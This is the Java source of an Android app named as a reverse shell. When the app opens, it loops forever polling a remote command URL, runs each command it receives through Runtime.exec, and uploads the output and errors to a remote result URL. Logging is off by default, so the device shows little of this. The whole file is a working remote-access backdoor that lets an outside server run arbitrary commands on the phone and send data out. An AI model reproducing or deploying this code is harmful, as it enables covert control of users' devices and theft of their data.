package com.ashish.reverseshell;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.widget.TextView;
import android.widget.Toast;

import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.InputStream;
import java.io.IOException;
import java.net.URL;
import java.net.URLEncoder;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;

public class Main extends Activity
{
    public static final boolean DEBUG_MODE = false;  // Set this to true for more logging.
    public static final String TAG = "ReverseShell";
    TextView textView;
    String command_url; // commands are read from here.
    String result_url; // results are uploaded to this url in get form (with param name "result").
    String command;
    URL url, resultUrl;
    HttpURLConnection urlConnection, resultUrlConnection;
    BufferedInputStream in;
    Process process;
    String completeOutput;
    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        command_url = getString(R.string.command_url);
        result_url = getString(R.string.result_url);
        textView = new TextView(this);
        byte command[] = new byte[1000];
        byte output[] = new byte[10 * 1000];
        byte error_output[] = new byte[10 * 1000];
        byte upload_output[] = new byte[10 * 1000];
        setContentView(textView);
        try {
          url = new URL(command_url);
        } catch (MalformedURLException e) {
          e.printStackTrace();
          log(TAG, "command url is malformed");
          finish();
        }
        while(true) {
          completeOutput = "";
          Toast.makeText(this, "Polling " + command_url, 1);
          log(TAG, "Polling " + command_url);
          try {
            urlConnection = (HttpURLConnection) url.openConnection();
            in = new BufferedInputStream(urlConnection.getInputStream());
            int command_length = in.read(command, 0, command.length);
            if (command_length > 0) {
              textView.setText(textView.getText() + "\n$" + command);
              log(TAG, "command is " + new String(command, 0 , command_length));
              process = Runtime.getRuntime().exec(new String(command, 0, command_length));
              InputStream processOutput = process.getInputStream();
              InputStream processError = process.getErrorStream();
              int output_length = processOutput.read(output, 0, output.length);
              int error_length = processError.read(error_output, 0, error_output.length);
              if (output_length > 0) {
                textView.setText(textView.getText() + "\n$" + output);
                completeOutput += new String(output, 0, output_length);
                log(TAG, "output is " + new String(output, 0, output_length));
              } else {
                log(TAG, "output is empty.");
              }
              if (error_length > 0) {
                textView.setText(textView.getText() + "\n$" + error_output);
                completeOutput += new String(error_output, 0, error_length);
                log(TAG, "error output is " + new String(error_output, 0, error_length));
              }
            } else {
              log(TAG, "command is empty.");
            }
            if (completeOutput.length() > 0) {
              // Post the output to a remote url.
              resultUrl = new URL(result_url + "?result=" + URLEncoder.encode(completeOutput));
              log(TAG, "Posting results to " + resultUrl);
              resultUrlConnection = (HttpURLConnection) resultUrl.openConnection();
              BufferedInputStream resultInputStream = new BufferedInputStream(resultUrlConnection.getInputStream());
              int result_input_length =  resultInputStream.read(upload_output, 0, upload_output.length);
              if (result_input_length > 0) {
                log(TAG, "uploading output is " + new String(upload_output, 0, result_input_length));
              } else {
                log(TAG, "empty uploading output.");
              }
            }
          } catch (IOException e) {
            e.printStackTrace();
          } finally {
            urlConnection.disconnect();
            if (resultUrlConnection != null) {
              resultUrlConnection.disconnect();
            }
          }
          try {
            Thread.sleep(3*1000);
          } catch (InterruptedException e) {
            e.printStackTrace();
          }
        }
    }

    public void log(String tag, String data) {
      if (DEBUG_MODE) {
        //I am lazy, so lets log everything as error log.
        Log.e(tag, data);
      }
    }
}
